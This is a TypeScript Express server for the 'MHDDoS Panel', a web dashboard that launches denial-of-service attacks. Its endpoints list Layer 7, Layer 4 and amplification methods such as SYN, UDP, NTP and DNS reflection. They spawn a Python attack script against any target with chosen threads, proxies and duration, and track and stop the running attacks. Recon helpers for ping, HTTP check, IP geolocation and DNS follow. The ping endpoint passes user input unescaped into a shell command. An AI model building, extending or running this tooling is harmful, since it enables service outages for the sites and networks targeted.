import express, { Request, Response, NextFunction } from 'express';
import cors from 'cors';
import path from 'path';
import { spawn, ChildProcessWithoutNullStreams, exec, execSync } from 'child_process';
import * as os from 'os';
import * as fs from 'fs';
import * as net from 'net';
import { randomBytes } from 'crypto';

const app = express();

const args = process.argv.slice(2);
const getArg = (flag: string) => {
  const idx = args.indexOf(flag);
  return idx !== -1 && args[idx + 1] ? args[idx + 1] : null;
};

const HOST = getArg('--host') || process.env.WEB_HOST || process.env.HOST || '127.0.0.1';
const PORT = parseInt(getArg('--port') || process.env.WEB_PORT || process.env.PORT || '5000', 10);
const WEB_PASSWORD = getArg('--password') || getArg('--secret') || process.env.WEB_PASSWORD || process.env.WEB_SECRET_KEY || '';

const BASE_DIR = path.resolve(__dirname, '..', '..');
const PYTHON_EXE = fs.existsSync(path.join(BASE_DIR, '.venv', 'Scripts', 'python.exe'))
  ? path.join(BASE_DIR, '.venv', 'Scripts', 'python.exe')
  : 'python';

app.use(cors());
app.use(express.json());

app.use((req: Request, res: Response, next: NextFunction) => {
  if (!WEB_PASSWORD) return next();
  if (req.path.startsWith('/public/') || req.path === '/favicon.ico') return next();
  
  const token = (req.headers['x-api-key'] as string) || (req.query.token as string) || (req.headers.authorization || '').replace('Bearer ', '');
  if (token !== WEB_PASSWORD) {
    if (req.path === '/' || !req.path.startsWith('/api/')) {
      res.setHeader('WWW-Authenticate', 'Basic realm="Login Required"');
      res.status(401).send('Unauthorized: Invalid WEB_PASSWORD');
      return;
    }
    res.status(401).json({ success: false, error: 'Unauthorized: Invalid API Token/Password.' });
    return;
  }
  next();
});

app.use(express.static(path.join(__dirname, '..', 'public')));

interface TaskEntry {
  id: string;
  pid: number;
  layer: string;
  method: string;
  target: string;
  threads: number;
  duration: number;
  startTime: number;
  status: 'RUNNING' | 'FINISHED' | 'STOPPED';
  process: ChildProcessWithoutNullStreams;
}

interface LogEntry {
  time: string;
  text: string;
}

const activeTasks = new Map<string, TaskEntry>();
const logHistory: LogEntry[] = [];
const sseClients = new Set<Response>();

const MAX_LOG_HISTORY = 500;

function ts(): string {
  return new Date().toTimeString().slice(0, 8);
}

function broadcastLog(text: string) {
  const entry: LogEntry = { time: ts(), text };
  logHistory.push(entry);
  if (logHistory.length > MAX_LOG_HISTORY) logHistory.shift();
  const data = JSON.stringify(entry);
  sseClients.forEach(client => {
    try { client.write(`data: ${data}\n\n`); } catch { sseClients.delete(client); }
  });
}

const L7_METHODS = ['APACHE','AVB','BOMB','BOT','BYPASS','CFB','CFBUAM','COOKIE','DGB','DOWNLOADER','DYN','EVEN','GET','GSB','HEAD','KILLER','NULL','OVH','POST','PPS','RHEX','SLOW','STOMP','STRESS','TOR','XMLRPC'];
const L4_METHODS = ['CONNECTION','CPS','FIVEM','FIVEM-TOKEN','ICMP','MCBOT','MCPE','MINECRAFT','OVH-UDP','SYN','TCP','TS3','UDP','VSE'];
const AMP_METHODS = ['ARD','CHAR','CLDAP','DNS','MEM','NTP','RDP'];

app.get('/api/methods', (_req: Request, res: Response) => {
  res.json({
    layer7: [...L7_METHODS].sort(),
    layer4: [...L4_METHODS].sort(),
    amplification: [...AMP_METHODS].sort(),
    sockTypes: [
      { id: 0, name: '0 — ALL (Config)' },
      { id: 1, name: '1 — HTTP' },
      { id: 4, name: '4 — SOCKS4' },
      { id: 5, name: '5 — SOCKS5' },
      { id: 6, name: '6 — RANDOM' },
    ],
  });
});

app.get('/api/system/stats', (_req: Request, res: Response) => {
  const cpus = os.cpus();
  const totalMem = os.totalmem();
  const freeMem = os.freemem();
  const usedMem = totalMem - freeMem;

  let netSent = 0;
  let netRecv = 0;
  let pkSent = 0;
  let pkRecv = 0;

  try {
    if (process.platform === 'win32') {
      const raw = execSync('powershell -Command "Get-NetAdapterStatistics | Select-Object -Property SentBytes,ReceivedBytes,SentPackets,ReceivedPackets | ConvertTo-Json"', { timeout: 3000 }).toString();
      const parsed = JSON.parse(raw);
      const entries = Array.isArray(parsed) ? parsed : [parsed];
      entries.forEach((e: any) => {
        netSent += e.SentBytes ?? 0;
        netRecv += e.ReceivedBytes ?? 0;
        pkSent += e.SentPackets ?? 0;
        pkRecv += e.ReceivedPackets ?? 0;
      });
    }
  } catch { /* fallback to zeros */ }

  const runningCount = [...activeTasks.values()].filter(t => t.status === 'RUNNING').length;

  res.json({
    cpu_percent: Math.round(cpus.reduce((acc, c) => acc + (100 - c.times.idle / (Object.values(c.times).reduce((a, b) => a + b, 0)) * 100), 0) / cpus.length),
    ram_percent: Math.round((usedMem / totalMem) * 100),
    ram_used_gb: +(usedMem / 1e9).toFixed(2),
    ram_total_gb: +(totalMem / 1e9).toFixed(2),
    bytes_sent: netSent,
    bytes_recv: netRecv,
    packets_sent: pkSent,
    packets_recv: pkRecv,
    active_attacks: runningCount,
  });
});

app.get('/api/files/info', (_req: Request, res: Response) => {
  const uaPath = path.join(BASE_DIR, 'files', 'useragent.txt');
  const refPath = path.join(BASE_DIR, 'files', 'referers.txt');
  const proxiesDir = path.join(BASE_DIR, 'files', 'proxies');

  const countLines = (fp: string) => {
    if (!fs.existsSync(fp)) return 0;
    return fs.readFileSync(fp, 'utf8').split('\n').filter(l => l.trim()).length;
  };

  const proxyFiles = fs.existsSync(proxiesDir)
    ? fs.readdirSync(proxiesDir).filter(f => f.endsWith('.txt'))
    : [];

  res.json({
    useragents_count: countLines(uaPath),
    referers_count: countLines(refPath),
    proxy_files: proxyFiles,
  });
});

app.post('/api/attacks/start', (req: Request, res: Response) => {
  const { layer, method, target, threads, duration, socks_type, proxylist, rpc, reflector } = req.body;

  if (!method || !target) {
    res.status(400).json({ success: false, error: 'Method and Target are required.' });
    return;
  }

  const args: string[] = [path.join(BASE_DIR, 'start.py'), method.toUpperCase(), target];

  if (layer === 'L7') {
    args.push(String(socks_type ?? 0), String(threads ?? 100), proxylist ?? 'http.txt', String(rpc ?? 10), String(duration ?? 60));
  } else {
    args.push(String(threads ?? 100), String(duration ?? 60));
    if (AMP_METHODS.includes(method.toUpperCase()) && reflector) {
      args.push(reflector);
    } else if (proxylist && socks_type != null) {
      args.push(String(socks_type), proxylist);
    }
  }

  try {
    const proc = spawn(PYTHON_EXE, args, {
      cwd: BASE_DIR,
      stdio: ['pipe', 'pipe', 'pipe'],
    });

    const taskId = randomBytes(4).toString('hex');

    const task: TaskEntry = {
      id: taskId,
      pid: proc.pid ?? 0,
      layer: layer ?? 'L7',
      method: method.toUpperCase(),
      target,
      threads: Number(threads ?? 100),
      duration: Number(duration ?? 60),
      startTime: Date.now(),
      status: 'RUNNING',
      process: proc as ChildProcessWithoutNullStreams,
    };

    activeTasks.set(taskId, task);
    broadcastLog(`[INFO] Task ${taskId} (PID ${proc.pid}) started — ${method.toUpperCase()} → ${target}`);

    proc.stdout.on('data', (data: Buffer) => {
      data.toString().split('\n').filter(l => l.trim()).forEach(line => broadcastLog(`[${taskId}] ${line}`));
    });
    proc.stderr.on('data', (data: Buffer) => {
      data.toString().split('\n').filter(l => l.trim()).forEach(line => broadcastLog(`[${taskId}!] ${line}`));
    });
    proc.on('close', (code: number | null) => {
      const t = activeTasks.get(taskId);
      if (t) {
        t.status = 'FINISHED';
        broadcastLog(`[INFO] Task ${taskId} finished with exit code ${code}.`);
      }
    });

    res.json({ success: true, task_id: taskId, pid: proc.pid });
  } catch (err: any) {
    res.status(500).json({ success: false, error: err.message });
  }
});

app.get('/api/attacks/active', (_req: Request, res: Response) => {
  const now = Date.now();
  const results = [...activeTasks.values()].map(t => {
    const elapsed = Math.floor((now - t.startTime) / 1000);
    return {
      id: t.id,
      pid: t.pid,
      layer: t.layer,
      method: t.method,
      target: t.target,
      threads: t.threads,
      duration: t.duration,
      elapsed,
      remaining: t.status === 'RUNNING' ? Math.max(0, t.duration - elapsed) : 0,
      status: t.status,
      start_time: new Date(t.startTime).toTimeString().slice(0, 8),
    };
  });
  res.json(results);
});

app.post('/api/attacks/stop', (req: Request, res: Response) => {
  const { id } = req.body as { id: string };
  const stopped: string[] = [];

  activeTasks.forEach((task, tid) => {
    if ((id === 'all' || id === tid) && task.status === 'RUNNING') {
      try {
        if (process.platform === 'win32' && task.process.pid) {
          execSync(`taskkill /pid ${task.process.pid} /f /t`, { stdio: 'ignore' });
        } else {
          task.process.kill('SIGKILL');
        }
        task.status = 'STOPPED';
        stopped.push(tid);
        broadcastLog(`[INFO] Task ${tid} (PID ${task.process.pid}) forcefully stopped.`);
      } catch (err: any) {
        broadcastLog(`[WARN] Could not kill task ${tid}: ${err?.message ?? err}`);
        task.status = 'STOPPED';
        stopped.push(tid);
      }
    }
  });

  res.json({ success: true, stopped });
});


app.post('/api/tools/ping', async (req: Request, res: Response) => {
  const { target } = req.body as { target: string };
  if (!target) { res.status(400).json({ success: false, error: 'Target required.' }); return; }

  const host = target.replace(/https?:\/\//, '').split('/')[0].split(':')[0];

  try {
    const isWin = process.platform === 'win32';
    const cmd = isWin ? `ping -n 4 ${host}` : `ping -c 4 -W 2 ${host}`;

    const output = await new Promise<string>(resolve => {
      exec(cmd, { timeout: 15000 }, (_err, stdout) => resolve(stdout ?? ''));
    });

    let avgRtt = 0, minRtt = 0, maxRtt = 0, received = 0;

    if (isWin) {
      const recvMatch = output.match(/Received\s*=\s*(\d+)/i);
      const minMatch  = output.match(/Minimum\s*=\s*(\d+)ms/i);
      const maxMatch  = output.match(/Maximum\s*=\s*(\d+)ms/i);
      const avgMatch  = output.match(/Average\s*=\s*(\d+)ms/i);
      received = recvMatch ? parseInt(recvMatch[1]) : 0;
      minRtt   = minMatch  ? parseInt(minMatch[1])  : 0;
      maxRtt   = maxMatch  ? parseInt(maxMatch[1])  : 0;
      avgRtt   = avgMatch  ? parseInt(avgMatch[1])  : 0;
    } else {
      const recvMatch = output.match(/(\d+) received/);
      const rttMatch  = output.match(/min\/avg\/max.*?=\s*([\d.]+)\/([\d.]+)\/([\d.]+)/);
      received = recvMatch ? parseInt(recvMatch[1]) : 0;
      if (rttMatch) {
        minRtt = parseFloat(rttMatch[1]);
        avgRtt = parseFloat(rttMatch[2]);
        maxRtt = parseFloat(rttMatch[3]);
      }
    }

    res.json({
      success: true,
      target: host,
      alive: received > 0,
      avg_rtt: avgRtt,
      min_rtt: minRtt,
      max_rtt: maxRtt,
      packets_sent: 4,
      packets_received: received,
      packet_loss: +((1 - received / 4) * 100).toFixed(1),
    });
  } catch (err: any) {
    res.status(500).json({ success: false, error: err.message });
  }
});

function validatePublicUrl(raw: string): string | null {
  try {
    const rawUrl = raw.startsWith('http://') || raw.startsWith('https://') ? raw : `http://${raw}`;
    const parsed = new URL(rawUrl);
    if (parsed.protocol !== 'http:' && parsed.protocol !== 'https:') return null;
    const hostname = parsed.hostname.toLowerCase();
    if (!hostname) return null;

    if (
      hostname === 'localhost' ||
      hostname === '127.0.0.1' ||
      hostname === '::1' ||
      hostname.startsWith('10.') ||
      hostname.startsWith('192.168.') ||
      (/^172\.(1[6-9]|2[0-9]|3[01])\./.test(hostname)) ||
      hostname.endsWith('.local')
    ) {
      return null;
    }
    return `${parsed.protocol}//${parsed.host}${parsed.pathname}${parsed.search}`;
  } catch {
    return null;
  }
}

app.post('/api/tools/check', async (req: Request, res: Response) => {
  const { target } = req.body as { target: string };
  if (!target) { res.status(400).json({ success: false, error: 'Target required.' }); return; }

  const url = validatePublicUrl(target);
  if (!url) { res.status(400).json({ success: false, error: 'Invalid or non-public target URL.' }); return; }

  try {
    const start = Date.now();
    const { default: fetch } = await import('node-fetch');
    const r = await (fetch as any)(url, {
      method: 'GET',
      headers: { 'User-Agent': 'MHDDoS-Panel/2.4.4' },
      redirect: 'manual',
      timeout: 10000,
    }) as any;
    const elapsed = Date.now() - start;
    const body = await r.buffer();

    res.json({
      success: true,
      url,
      status_code: r.status,
      status_text: r.statusText,
      response_time_ms: elapsed,
      server: r.headers.get('server') ?? 'Unknown',
      content_type: r.headers.get('content-type') ?? 'Unknown',
      content_length: body.length,
      online: r.status < 500,
    });
  } catch (err: any) {
    res.status(500).json({ success: false, error: err.message });
  }
});

app.post('/api/tools/info', async (req: Request, res: Response) => {
  const { target } = req.body as { target: string };
  if (!target) { res.status(400).json({ success: false, error: 'Target required.' }); return; }

  const host = target.replace(/https?:\/\//, '').split('/')[0];

  try {
    const { default: fetch } = await import('node-fetch');
    const r = await (fetch as any)(`https://ipwhois.app/json/${host}`, { timeout: 8000 }) as any;
    const data: any = await r.json();
    res.json({
      success: data.success ?? false,
      ip: data.ip ?? host,
      country: data.country ?? 'Unknown',
      country_code: data.country_code ?? '',
      city: data.city ?? 'Unknown',
      region: data.region ?? 'Unknown',
      isp: data.isp ?? 'Unknown',
      org: data.org ?? 'Unknown',
      asn: data.asn ?? 'Unknown',
      latitude: data.latitude ?? 0,
      longitude: data.longitude ?? 0,
    });
  } catch (err: any) {
    res.status(500).json({ success: false, error: err.message });
  }
});

app.post('/api/tools/dns', async (req: Request, res: Response) => {
  const { target } = req.body as { target: string };
  if (!target) { res.status(400).json({ success: false, error: 'Target required.' }); return; }

  const domain = target.replace(/https?:\/\//, '').split('/')[0];

  try {
    const { default: fetch } = await import('node-fetch');
    const types = ['A', 'AAAA', 'MX', 'NS', 'TXT'];
    const records: Record<string, string[]> = {};

    await Promise.all(
      types.map(async type => {
        try {
          const r = await (fetch as any)(`https://dns.google/resolve?name=${domain}&type=${type}`, { timeout: 5000 }) as any;
          const data: any = await r.json();
          records[type] = (data.Answer ?? []).map((a: any) => a.data);
        } catch {
          records[type] = [];
        }
      })
    );

    res.json({ success: true, domain, records });
  } catch (err: any) {
    res.status(500).json({ success: false, error: err.message });
  }
});

app.get('/api/logs/stream', (req: Request, res: Response) => {
  res.setHeader('Content-Type', 'text/event-stream');
  res.setHeader('Cache-Control', 'no-cache');
  res.setHeader('Connection', 'keep-alive');
  res.setHeader('X-Accel-Buffering', 'no');
  res.flushHeaders();

  sseClients.add(res);

  logHistory.forEach(entry => {
    res.write(`data: ${JSON.stringify(entry)}\n\n`);
  });

  req.on('close', () => sseClients.delete(res));
});

app.get('*', (_req: Request, res: Response) => {
  res.sendFile(path.join(__dirname, '..', 'public', 'index.html'));
});

app.listen(PORT, HOST, () => {
  console.log(`[MHDDoS Panel] Running → http://${HOST}:${PORT}`);
});
